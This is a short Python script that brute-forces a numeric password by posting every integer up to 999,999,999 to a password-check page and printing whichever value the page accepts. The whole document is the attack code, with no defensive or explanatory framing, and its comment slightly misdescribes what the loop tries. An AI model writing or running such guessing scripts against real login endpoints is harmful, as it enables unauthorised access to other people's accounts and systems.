import requests

# Set the URL of the password checker
url = 'http://example.com/checkPassword.php'

# Try all combinations of numbers from 0 to 9
for i in range(1000000000):
  password = str(i)

  # Send the password to the password checker
  r = requests.post(url, data={'password': password})

  # Check the response from the password checker
  if r.text == 'correct':
    # Display the correct password if it is found
    print(f'The correct password is: {password}')
    break
